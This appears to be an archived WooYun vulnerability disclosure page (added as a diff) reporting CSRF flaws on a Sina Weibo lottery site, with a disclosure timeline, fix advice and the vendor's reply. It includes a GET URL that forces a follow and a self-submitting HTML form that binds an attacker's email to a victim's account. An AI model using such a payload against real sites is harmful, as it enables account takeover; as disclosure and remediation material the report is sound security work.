@@ -1,0 +1,193 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博还一处CSRF刷粉丝【非常严重】  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博还一处CSRF刷粉丝【非常严重】  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风萧萧">风萧萧</a> 
+</li><li>提交时间：		2013-01-10 16:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-30：	细节向普通白帽子公开<br/>
+									2013-02-09：	细节向实习白帽子公开<br/>
+									2013-02-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">1.加关注的接口POST变GET；<br />
+2.不只是刷粉丝呢，xss可以偷身份，csrf同样可以的！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.是这个站点撒：http://caipiao.weibo.com,先登录，将信息填好撒！</p><p class="detail"><a href="../images/10155330d248e3df0d045dd12760d05b41a1ae18.jpg" target="_blank"><img src="../images/10155330d248e3df0d045dd12760d05b41a1ae18.jpg" alt="0.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.加关注的接口本来是一个POST请求的，结果我简单试了下，直接GET也可以撒，这个不能原谅哦，如下：</p><pre><code>http://w.aicai.com/ajaxCareFriend.do?uid=1981622273</code></pre><p class='detail'>直接访问，再看看微博关注了谁吧：</p><p class="detail"><a href="../images/10155621452624f050edfac9de1644b5f9648d68.jpg" target="_blank"><img src="../images/10155621452624f050edfac9de1644b5f9648d68.jpg" alt="00.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">3.再看另一个问题，CSRF绑定邮箱，再取回密码，进入【安全中心】：</p><p class="detail"><a href="../images/101600451ca686a702473fa19a6cb614c33b600a.jpg" target="_blank"><img src="../images/101600451ca686a702473fa19a6cb614c33b600a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+4.在邮箱那里，点击立即设置，填好事先准备的QQ邮箱：</p><p class="detail"><a href="../images/101602339de06044bf63aec1cb26a82ac89bc1a0.jpg" target="_blank"><img src="../images/101602339de06044bf63aec1cb26a82ac89bc1a0.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+5.将该请求抓下，准备一个POST请求的POC页面，这个要是能GET，麻烦就大了：</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;fengxiaoxiao&quot; name=&quot;fengxiaoxiao&quot; action=&quot;http://w.aicai.com/userEmail.do&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;email&quot; value=&quot;*********@qq.com&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.fengxiaoxiao.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+6.把链接发给指定的人撒，QQ邮箱来邮件了：</p><p class="detail"><a href="../images/1016053113cb3194e4453a6c4f3a7d7602f33811.jpg" target="_blank"><img src="../images/1016053113cb3194e4453a6c4f3a7d7602f33811.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+7.用另一个微博账号点击上述链接，成功绑定！<br />
+<br />
+</p><p class="detail"><a href="../images/10160725a1a983c0e9b0ea42b9062e53b77231b4.jpg" target="_blank"><img src="../images/10160725a1a983c0e9b0ea42b9062e53b77231b4.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/101611233c0a4f80205457f63b4b19d3e5fa462b.jpg" target="_blank"><img src="../images/101611233c0a4f80205457f63b4b19d3e5fa462b.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.CSRF要彻底检查下啊，不只是这两个地方；<br />
+<br />
+2.绑定邮箱的地方经实践证明，可以直接GET的，麻烦大了<br />
+<br />
+3.关键接口没有做用户验证，比如提示用户首先输入密码才可绑定邮箱或手机，哪怕设置一个图片验证码也可防止这种情况；<br />
+<br />
+4.礼物啊礼物！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风萧萧" title="风萧萧">风萧萧</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017172" title="新浪微博还一处CSRF刷粉丝【非常严重】">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：2 </p>
+													<p class="detail">确认时间：2013-01-10 16:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">多谢提供，此问题已经内部发现并通知了相关负责人进行修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17172";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
